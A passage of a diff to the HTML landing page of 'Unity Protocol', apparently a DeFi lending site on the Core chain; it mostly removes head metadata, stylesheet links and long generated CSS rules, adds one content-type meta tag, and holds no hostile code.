@@ -1,2138 +1,877 @@
 <!DOCTYPE html>
 <html lang="en">
 
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
 <head>
-    <meta charSet="utf-8" />
-    <meta name="viewport" content="initial-scale=1, width=device-width" />
-    <title>Unity Protocol- The First Lending Protocol On Core</title>
-    <meta name="description"
-        content="The First Lending Protocol On Core" />
-    <meta property="og:title" content="Unity Protocol- The First Lending Protocol On Core" />
-    <meta property="og:description"
-        content="Unity Protocol is The First is the first Lending Protocol On Core" />
-    <meta property="og:image" content="unitycore.png" />
-    <meta name="twitter:image" content="unitycore.png" />
-    <meta name="twitter:image:alt" content="aave governance image" />
-    <meta name="twitter:site" content="@unitycorepro" />
-    <meta property="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="The First Lending Protocol On Core" />
-    <meta name="twitter:description"
-        content="The First Lending Protocol On Core" />
-    <meta name="keywords"
-        content="Decentralized Finance, DeFi, lending, borrowing, stablecoins, Core Chain, assets, Core, smart contracts, open finance, trustless" />
-    <meta name="next-head-count" content="14" />
-    <meta name="theme-color" content="#00244D" />
-    <link rel="shortcut icon" href="unitycore.png" />
-    <script src="index.js"></script>
-     <!-- Latest compiled and minified CSS -->
-     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
-     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
-     <link href='https://fonts.googleapis.com/css?family=Space Grotesk' rel='stylesheet'>
-    <style data-emotion="css-global kpnynb">
-        html {
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            box-sizing: border-box;
-            -webkit-text-size-adjust: 100%;
-        }
-
-        *,
-        *::before,
-        *::after {
-            box-sizing: inherit;
-        }
-
-        strong,
-        b {
-            font-weight: 700;
-        }
-
-        body {
-            margin: 0;
-            color: #303549;
-            background-color: #F1F1F3;
-        }
-
-        @media print {
-            body {
-                background-color: #fff;
-            }
-        }
-
-        body::backdrop {
-            background-color: #F1F1F3;
-        }
-
-        body {
-            font-family: Inter, Arial;
-            font-weight: 400;
-            font-size: 0.875rem;
-            min-width: 375px;
-        }
-
-        body>div:first-of-type {
-            min-height: 100vh;
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-        }
-    </style>
-    <style data-emotion="css-global 1prfaxn">
-        @-webkit-keyframes mui-auto-fill {
-            from {
-                display: block;
-            }
-        }
-
-        @keyframes mui-auto-fill {
-            from {
-                display: block;
-            }
-        }
-
-        @-webkit-keyframes mui-auto-fill-cancel {
-            from {
-                display: block;
-            }
-        }
-
-        @keyframes mui-auto-fill-cancel {
-            from {
-                display: block;
-            }
-        }
-    </style>
-    <style data-emotion="css-global animation-c7515d">
-        @-webkit-keyframes animation-c7515d {
-            0% {
-                opacity: 1;
-            }
-
-            50% {
-                opacity: 0.4;
-            }
-
-            100% {
-                opacity: 1;
-            }
-        }
-
-        @keyframes animation-c7515d {
-            0% {
-                opacity: 1;
-            }
-
-            50% {
-                opacity: 0.4;
-            }
-
-            100% {
-                opacity: 1;
-            }
-        }
-    </style>
-    <style
-        data-emotion="css pkijvr 1abeg8a 5hicrt 1me2gch 1dvha5n sfox7e a6b3rd 1lg82l4 1ogtsao y0zxrm i9gxme 9fybxg 1x9sid4 q5q60p 1100lx1 b95f0i 614h4q ycl373 nkvznt 70qvj9 1czjwln gr0tg3 1s2gcw8 o4f6xn nq2fwf 1slt5fp vc54u4 1jz7z4v wzu3c my2x37 1k3x8v3 1b6c8bu igs3ac ihdtdm k7vncv ltjh6b q6wgnv j7qwjs 18biwo 1fzsl0k o92e62 ulme3a a9efdy 1rqf5ri 159pi92 1a8qn2o 11mxx5g 11zj654 roudg2">
-        .css-pkijvr {
-            height: 48px;
-            position: -webkit-sticky;
-            position: sticky;
-            top: 0;
-            -webkit-transition: top 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: top 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            z-index: 1100;
-            background-color: #191b28;
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-flex-direction: space-between;
-            -ms-flex-direction: space-between;
-            flex-direction: space-between;
-            box-shadow: inset 0px -1px 0px rgba(242, 243, 247, 0.16);
-        }
-
-        @media (min-width:0px) {
-            .css-pkijvr {
-                padding: 8px 8px 8px 20px;
-            }
-        }
-
-        @media (min-width:640px) {
-            .css-pkijvr {
-                padding: 8px 20px;
-            }
-        }
-
-        .css-1abeg8a {
-            margin: 0;
-            font-family: Inter, Arial;
-            font-weight: 400;
-            letter-spacing: 0.009375rem;
-            line-height: 143%;
-            font-size: 0.875rem;
-            color: #383D51;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            line-height: 0;
-            margin-right: 12px;
-            -webkit-transition: 0.3s ease all;
-            transition: 0.3s ease all;
-        }
-
-        .css-1abeg8a:hover {
-            opacity: 0.7;
-        }
-
-        .css-5hicrt {
-            margin-right: 12px;
-        }
-
-        @media (min-width:0px) {
-            .css-1me2gch {
-                display: none;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-1me2gch {
-                display: block;
-            }
-        }
-
-        .css-1dvha5n {
-            list-style: none;
-            margin: 0;
-            padding: 0;
-            position: relative;
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-        }
-
-        .css-1dvha5n .MuiMenuItem-root+.MuiDivider-root,
-        .css-1dvha5n .MuiDivider-root {
-            margin-top: 4px;
-            margin-bottom: 4px;
-        }
-
-        @media (min-width:0px) {
-            .css-1dvha5n {
-                -webkit-align-items: flex-start;
-                -webkit-box-align: flex-start;
-                -ms-flex-align: flex-start;
-                align-items: flex-start;
-                -webkit-flex-direction: column;
-                -ms-flex-direction: column;
-                flex-direction: column;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-1dvha5n {
-                -webkit-align-items: center;
-                -webkit-box-align: center;
-                -ms-flex-align: center;
-                align-items: center;
-                -webkit-flex-direction: row;
-                -ms-flex-direction: row;
-                flex-direction: row;
-            }
-        }
-
-        .css-sfox7e {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-box-pack: start;
-            -ms-flex-pack: start;
-            -webkit-justify-content: flex-start;
-            justify-content: flex-start;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            position: relative;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            width: 100%;
-            box-sizing: border-box;
-            text-align: left;
-        }
-
-        .css-sfox7e.Mui-focusVisible {
-            background-color: #F1F1F3;
-        }
-
-        .css-sfox7e.Mui-selected {
-            background-color: rgba(56, 61, 81, 0.08);
-        }
-
-        .css-sfox7e.Mui-selected.Mui-focusVisible {
-            background-color: rgba(56, 61, 81, 0.2);
-        }
-
-        .css-sfox7e.Mui-disabled {
-            opacity: 0.38;
-        }
-
-        @media (min-width:0px) {
-            .css-sfox7e {
-                width: 100%;
-                margin-right: 0px;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-sfox7e {
-                width: unset;
-                margin-right: 8px;
-            }
-        }
-
-        .css-a6b3rd {
-            margin: 0;
-            font-family: Inter, Arial;
-            font-weight: 400;
-            letter-spacing: 0.009375rem;
-            line-height: 143%;
-            font-size: 0.875rem;
-            color: #383D51;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            position: relative;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            background-color: transparent;
-            outline: 0;
-            border: 0;
-            margin: 0;
-            border-radius: 0;
-            padding: 0;
-            cursor: pointer;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            vertical-align: middle;
-            -moz-appearance: none;
-            -webkit-appearance: none;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            color: inherit;
-            min-width: 64px;
-            padding: 6px 8px;
-            border-radius: 4px;
-            -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            color: #383D51;
-            box-shadow: none;
-            border-radius: 4px;
-            font-family: Inter, Arial;
-            font-weight: 500;
-            line-height: 1.5rem;
-            font-size: 0.875rem;
-            padding: 6px 12px;
-            color: #F1F1F3;
-            padding: 6px 8px;
-            position: relative;
-        }
-
-        .css-a6b3rd::-moz-focus-inner {
-            border-style: none;
-        }
-
-        .css-a6b3rd.Mui-disabled {
-            pointer-events: none;
-            cursor: default;
-        }
-
-        @media print {
-            .css-a6b3rd {
-                -webkit-print-color-adjust: exact;
-                color-adjust: exact;
-            }
-        }
-
-        .css-a6b3rd:hover {
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            background-color: rgba(56, 61, 81, 0.04);
-        }
-
-        @media (hover: none) {
-            .css-a6b3rd:hover {
-                background-color: transparent;
-            }
-        }
-
-        .css-a6b3rd.Mui-disabled {
-            color: #BBBECA;
-        }
-
-        .css-a6b3rd:hover {
-            box-shadow: none;
-        }
-
-        .css-a6b3rd.Mui-focusVisible {
-            box-shadow: none;
-        }
-
-        .css-a6b3rd:active {
-            box-shadow: none;
-        }
-
-        .css-a6b3rd.Mui-disabled {
-            box-shadow: none;
-        }
-
-        .active.css-a6b3rd:after,
-        .css-a6b3rd:hover.css-a6b3rd:after {
-            -webkit-transform: scaleX(1);
-            -moz-transform: scaleX(1);
-            -ms-transform: scaleX(1);
-            transform: scaleX(1);
-            transform-origin: bottom left;
-        }
-
-        .css-a6b3rd:after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            -webkit-transform: scaleX(0);
-            -moz-transform: scaleX(0);
-            -ms-transform: scaleX(0);
-            transform: scaleX(0);
-            height: 2px;
-            bottom: -6px;
-            left: 0;
-            background: linear-gradient(248.86deg, #296ffa 10.51%, #6717ce 93.41%);
-            transform-origin: bottom right;
-            -webkit-transition: -webkit-transform 0.25s ease-out;
-            transition: transform 0.25s ease-out;
-        }
-
-        .css-1lg82l4 {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-box-pack: start;
-            -ms-flex-pack: start;
-            -webkit-justify-content: flex-start;
-            justify-content: flex-start;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            position: relative;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            width: 100%;
-            box-sizing: border-box;
-            text-align: left;
-            width: unset;
-        }
-
-        .css-1lg82l4.Mui-focusVisible {
-            background-color: #F1F1F3;
-        }
-
-        .css-1lg82l4.Mui-selected {
-            background-color: rgba(56, 61, 81, 0.08);
-        }
-
-        .css-1lg82l4.Mui-selected.Mui-focusVisible {
-            background-color: rgba(56, 61, 81, 0.2);
-        }
-
-        .css-1lg82l4.Mui-disabled {
-            opacity: 0.38;
-        }
-
-        @media (min-width:0px) {
-            .css-1lg82l4 {
-                display: none;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-1lg82l4 {
-                display: -webkit-box;
-                display: -webkit-flex;
-                display: -ms-flexbox;
-                display: flex;
-            }
-        }
-
-        .css-1ogtsao {
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            position: relative;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            background-color: transparent;
-            outline: 0;
-            border: 0;
-            margin: 0;
-            border-radius: 0;
-            padding: 0;
-            cursor: pointer;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            vertical-align: middle;
-            -moz-appearance: none;
-            -webkit-appearance: none;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            color: inherit;
-            min-width: 64px;
-            padding: 6px 8px;
-            border-radius: 4px;
-            -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            color: #383D51;
-            box-shadow: none;
-            border-radius: 4px;
-            font-family: Inter, Arial;
-            font-weight: 500;
-            line-height: 1.5rem;
-            font-size: 0.875rem;
-            padding: 6px 12px;
-            color: #F1F1F3;
-            min-width: unset;
-            padding: 6px 8px;
-        }
-
-        .css-1ogtsao::-moz-focus-inner {
-            border-style: none;
-        }
-
-        .css-1ogtsao.Mui-disabled {
-            pointer-events: none;
-            cursor: default;
-        }
-
-        @media print {
-            .css-1ogtsao {
-                -webkit-print-color-adjust: exact;
-                color-adjust: exact;
-            }
-        }
-
-        .css-1ogtsao:hover {
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            background-color: rgba(56, 61, 81, 0.04);
-        }
-
-        @media (hover: none) {
-            .css-1ogtsao:hover {
-                background-color: transparent;
-            }
-        }
-
-        .css-1ogtsao.Mui-disabled {
-            color: #BBBECA;
-        }
-
-        .css-1ogtsao:hover {
-            box-shadow: none;
-        }
-
-        .css-1ogtsao.Mui-focusVisible {
-            box-shadow: none;
-        }
-
-        .css-1ogtsao:active {
-            box-shadow: none;
-        }
-
-        .css-1ogtsao.Mui-disabled {
-            box-shadow: none;
-        }
-
-        .css-1ogtsao:hover {
-            background-color: rgba(250, 251, 252, 0.08);
-        }
-
-        .css-y0zxrm {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            width: 1em;
-            height: 1em;
-            display: inline-block;
-            fill: currentColor;
-            -webkit-flex-shrink: 0;
-            -ms-flex-negative: 0;
-            flex-shrink: 0;
-            -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            font-size: 1.5rem;
-            margin-left: 4px;
-        }
-
-        .css-i9gxme {
-            -webkit-box-flex: 1;
-            -webkit-flex-grow: 1;
-            -ms-flex-positive: 1;
-            flex-grow: 1;
-        }
-
-        .css-9fybxg {
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            position: relative;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            background-color: transparent;
-            outline: 0;
-            border: 0;
-            margin: 0;
-            border-radius: 0;
-            padding: 0;
-            cursor: pointer;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            vertical-align: middle;
-            -moz-appearance: none;
-            -webkit-appearance: none;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            color: inherit;
-            min-width: 64px;
-            padding: 6px 16px;
-            border-radius: 4px;
-            -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            box-shadow: none;
-            border-radius: 4px;
-            font-family: 'Space Grotesk';
-            font-weight: 500;
-            line-height: 1.5rem;
-            font-size: 0.875rem;
-            padding: 6px 12px;
-            color: #fff;
-            background: linear-gradient(248.86deg, #296ffa 10.51%, #6717ce 93.41%);
-            -webkit-transition: all 0.2s ease;
-            transition: all 0.2snn ease;
-            margin-bottom: 10px;
-            gap: 0.5vw;
-           
-        }
-
-        .css-9fybxg::-moz-focus-inner {
-            border-style: none;
-        }
-
-        .css-9fybxg.Mui-disabled {
-            pointer-events: none;
-            cursor: default;
-        }
-
-        @media print {
-            .css-9fybxg {
-                -webkit-print-color-adjust: exact;
-                color-adjust: exact;
-            }
-        }
-
-        .css-9fybxg:hover {
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            background-color: rgba(48, 53, 73, 0.04);
-        }
-
-        @media (hover: none) {
-            .css-9fybxg:hover {
-                background-color: transparent;
-            }
-        }
-
-        .css-9fybxg.Mui-disabled {
-            color: #BBBECA;
-        }
-
-        .css-9fybxg:hover {
-            box-shadow: none;
-        }
-
-        .css-9fybxg.Mui-focusVisible {
-            box-shadow: none;
-        }
-
-        .css-9fybxg:active {
-            box-shadow: none;
-        }
-
-        .css-9fybxg.Mui-disabled {
-            box-shadow: none;
-        }
-
-        .css-9fybxg:hover,
-        .css-9fybxg.Mui-focusVisible {
-            background: linear-gradient(248.86deg, #296ffa 10.51%, #6717ce 93.41%);
-            opacity: 0.9;
-        }
-
-        .css-1x9sid4 {
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            position: relative;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            background-color: transparent;
-            outline: 0;
-            border: 0;
-            margin: 0;
-            border-radius: 0;
-            padding: 0;
-            cursor: pointer;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            vertical-align: middle;
-            -moz-appearance: none;
-            -webkit-appearance: none;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            color: inherit;
-            min-width: 64px;
-            padding: 6px 16px;
-            border-radius: 4px;
-            -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            box-shadow: none;
-            border-radius: 4px;
-            font-family: Inter, Arial;
-            font-weight: 500;
-            line-height: 1.5rem;
-            font-size: 0.875rem;
-            padding: 6px 12px;
-            color: #fff;
-            border: 1px solid;
-            border-color: #EBEBED1F;
-            background-color: #383D51;
-            padding: 7px 8px;
-            min-width: unset;
-            margin-left: 8px;
-        }
-
-        .css-1x9sid4::-moz-focus-inner {
-            border-style: none;
-        }
-
-        .css-1x9sid4.Mui-disabled {
-            pointer-events: none;
-            cursor: default;
-        }
-
-        @media print {
-            .css-1x9sid4 {
-                -webkit-print-color-adjust: exact;
-                color-adjust: exact;
-            }
-        }
-
-        .css-1x9sid4:hover {
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            background-color: rgba(48, 53, 73, 0.04);
-        }
-
-        @media (hover: none) {
-            .css-1x9sid4:hover {
-                background-color: transparent;
-            }
-        }
-
-        .css-1x9sid4.Mui-disabled {
-            color: #BBBECA;
-        }
-
-        .css-1x9sid4:hover {
-            box-shadow: none;
-        }
-
-        .css-1x9sid4.Mui-focusVisible {
-            box-shadow: none;
-        }
-
-        .css-1x9sid4:active {
-            box-shadow: none;
-        }
-
-        .css-1x9sid4.Mui-disabled {
-            box-shadow: none;
-        }
-
-        .css-1x9sid4:hover,
-        .css-1x9sid4.Mui-focusVisible {
-            background-color: #2B2D3C;
-        }
-
-        .css-q5q60p {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            width: 1em;
-            height: 1em;
-            display: inline-block;
-            fill: currentColor;
-            -webkit-flex-shrink: 0;
-            -ms-flex-negative: 0;
-            flex-shrink: 0;
-            -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            font-size: 1.25rem;
-            color: #F1F1F3;
-        }
-
-        @media (min-width:0px) {
-            .css-1100lx1 {
-                display: -webkit-box;
-                display: -webkit-flex;
-                display: -ms-flexbox;
-                display: flex;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-1100lx1 {
-                display: none;
-            }
-        }
-
-        .css-b95f0i {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-            -webkit-flex: 1;
-            -ms-flex: 1;
-            flex: 1;
-        }
-
-        .css-614h4q {
-            background-color: #191b28;
-            color: #F1F1F3;
-        }
-
-        @media (min-width:0px) {
-            .css-614h4q {
-                padding-top: 40px;
-                padding-bottom: 72px;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-614h4q {
-                padding-top: 48px;
-                padding-bottom: 80px;
-            }
-        }
-
-        @media (min-width:1280px) {
-            .css-614h4q {
-                padding-bottom: 94px;
-            }
-        }
-
-        @media (min-width:1575px) {
-            .css-614h4q {
-                padding-bottom: 92px;
-            }
-        }
-
-        @media (min-width:1800px) {
-            .css-614h4q {
-                padding-bottom: 96px;
-            }
-        }
-
-        .css-ycl373 {
-            width: 100%;
-            margin-left: auto;
-            box-sizing: border-box;
-            margin-right: auto;
-            display: block;
-            padding-left: 8px;
-            padding-right: 8px;
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-            -webkit-flex: 1;
-            -ms-flex: 1;
-            flex: 1;
-            padding-bottom: 39px;
-            padding-bottom: 0px;
-        }
-
-        @media (min-width:760px) {
-            .css-ycl373 {
-                padding-left: 12px;
-                padding-right: 12px;
-            }
-        }
-
-        @media (min-width:1280px) {
-            .css-ycl373 {
-                max-width: 1280px;
-            }
-        }
-
-        @media (min-width:0px) {
-            .css-ycl373 {
-                padding-left: 8px;
-                padding-right: 8px;
-            }
-        }
-
-        @media (min-width:640px) {
-            .css-ycl373 {
-                padding-left: 20px;
-                padding-right: 20px;
-            }
-        }
-
-        @media (min-width:760px) {
-            .css-ycl373 {
-                padding-left: 48px;
-                padding-right: 48px;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-ycl373 {
-                padding-left: 96px;
-                padding-right: 96px;
-            }
-        }
-
-        @media (min-width:1280px) {
-            .css-ycl373 {
-                padding-left: 20px;
-                padding-right: 20px;
-            }
-        }
-
-        @media (min-width:1575px) {
-            .css-ycl373 {
-                max-width: unset;
-                padding-left: 96px;
-                padding-right: 96px;
-            }
-        }
-
-        @media (min-width:1800px) {
-            .css-ycl373 {
-                padding-left: 0;
-                padding-right: 0;
-                max-width: 1440px;
-            }
-        }
-
-        @media (min-width:0px) {
-            .css-nkvznt {
-                padding-left: 16px;
-                padding-right: 16px;
-            }
-        }
-
-        @media (min-width:640px) {
-            .css-nkvznt {
-                padding-left: 24px;
-                padding-right: 24px;
-            }
-        }
-
-        .css-70qvj9 {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-        }
-
-        .css-1czjwln {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            margin-bottom: 16px;
-        }
-
-        @media (min-width:0px) {
-            .css-1czjwln {
-                -webkit-align-items: flex-start;
-                -webkit-box-align: flex-start;
-                -ms-flex-align: flex-start;
-                align-items: flex-start;
-                -webkit-flex-direction: column;
-                -ms-flex-direction: column;
-                flex-direction: column;
-            }
-        }
-
-        @media (min-width:640px) {
-            .css-1czjwln {
-                -webkit-align-items: center;
-                -webkit-box-align: center;
-                -ms-flex-align: center;
-                align-items: center;
-                -webkit-flex-direction: row;
-                -ms-flex-direction: row;
-                flex-direction: row;
-            }
-        }
-
-        .css-gr0tg3 {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-align-items: flex-start;
-            -webkit-box-align: flex-start;
-            -ms-flex-align: flex-start;
-            align-items: flex-start;
-            -webkit-box-flex-wrap: wrap;
-            -webkit-flex-wrap: wrap;
-            -ms-flex-wrap: wrap;
-            flex-wrap: wrap;
-            margin-bottom: 0px;
-        }
-
-        .css-1s2gcw8 {
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-            position: relative;
-            min-width: 0;
-            padding: 0;
-            margin: 0;
-            border: 0;
-            vertical-align: top;
-            margin-right: 8px;
-        }
-
-        .css-1s2gcw8 .MuiOutlinedInput-notchedOutline {
-            border: none;
-        }
-
-        .css-o4f6xn {
-            color: #303549;
-            line-height: 1.4375em;
-            box-sizing: border-box;
-            position: relative;
-            cursor: text;
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            position: relative;
-            border-radius: 4px;
-            border-radius: 6px;
-            border-color: #EAEBEF;
-        }
-
-        .css-o4f6xn.Mui-disabled {
-            color: #D2D4DC;
-            cursor: default;
-        }
-
-        .css-o4f6xn:hover .MuiOutlinedInput-notchedOutline {
-            border-color: #303549;
-        }
-
-        @media (hover: none) {
-            .css-o4f6xn:hover .MuiOutlinedInput-notchedOutline {
-                border-color: rgba(0, 0, 0, 0.23);
-            }
-        }
-
-        .css-o4f6xn.Mui-focused .MuiOutlinedInput-notchedOutline {
-            border-color: #383D51;
-            border-width: 2px;
-        }
-
-        .css-o4f6xn.Mui-error .MuiOutlinedInput-notchedOutline {
-            border-color: #BC0000B8;
-        }
-
-        .css-o4f6xn.Mui-disabled .MuiOutlinedInput-notchedOutline {
-            border-color: #BBBECA;
-        }
-
-        .css-o4f6xn:hover .MuiOutlinedInput-notchedOutline {
-            border-color: #CBCDD8;
-        }
-
-        .css-o4f6xn.Mui-focused .MuiOutlinedInput-notchedOutline {
-            border-color: #CBCDD8;
-        }
-
-        .css-o4f6xn.MarketSwitcher__select .MuiSelect-outlined {
-            padding-left: 0px;
-            padding-top: 0px;
-            padding-bottom: 0px;
-            background-color: transparent !important;
-        }
-
-        .css-o4f6xn .MuiSelect-icon {
-            color: #F1F1F3;
-        }
-
-        .css-nq2fwf {
-            -moz-appearance: none;
-            -webkit-appearance: none;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font: inherit;
-            letter-spacing: inherit;
-            color: currentColor;
-            padding: 4px 0 5px;
-            border: 0;
-            box-sizing: content-box;
-            background: none;
-            height: 1.4375em;
-            margin: 0;
-            -webkit-tap-highlight-color: transparent;
-            display: block;
-            min-width: 0;
-            width: 100%;
-            -webkit-animation-name: mui-auto-fill-cancel;
-            animation-name: mui-auto-fill-cancel;
-            -webkit-animation-duration: 10ms;
-            animation-duration: 10ms;
-            padding: 16.5px 14px;
-        }
-
-        .css-nq2fwf:focus {
-            border-radius: 4px;
-        }
-
-        .css-nq2fwf::-ms-expand {
-            display: none;
-        }
-
-        .css-nq2fwf.Mui-disabled {
-            cursor: default;
-        }
-
-        .css-nq2fwf[multiple] {
-            height: auto;
-        }
-
-        .css-nq2fwf:not([multiple]) option,
-        .css-nq2fwf:not([multiple]) optgroup {
-            background-color: #FFFFFF;
-        }
-
